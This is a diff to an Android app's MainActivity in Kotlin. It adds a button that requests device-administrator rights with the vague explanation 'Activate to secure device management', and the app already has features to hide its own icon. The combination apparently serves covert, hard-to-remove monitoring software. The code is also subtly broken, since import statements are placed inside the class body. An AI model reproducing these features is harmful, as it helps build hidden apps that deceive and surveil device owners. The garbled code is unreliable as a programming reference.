@@ -26,7 +26,10 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnBatteryPerm: Button
     private lateinit var tvStatus: TextView
     private lateinit var btnOpenDashboard: Button
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
     private lateinit var btnHideApp: Button
+    private lateinit var btnActivateAdmin: Button
 
     private fun hideAppIcon(context: Context) {
         val p = context.packageManager
@@ -48,9 +51,18 @@ class MainActivity : AppCompatActivity() {
         tvStatus = findViewById(R.id.tvStatus)
         btnOpenDashboard = findViewById(R.id.btnOpenDashboard)
         btnHideApp = findViewById(R.id.btnHideApp)
+        btnActivateAdmin = findViewById(R.id.btnActivateAdmin)
 
         btnHideApp.setOnClickListener {
             hideAppIcon(this)
+        }
+
+        btnActivateAdmin.setOnClickListener {
+            val adminComponent = ComponentName(this, AdminReceiver::class.java)
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Activate to secure device management.")
+            startActivity(intent)
         }
 
         btnOpenDashboard.setOnClickListener {
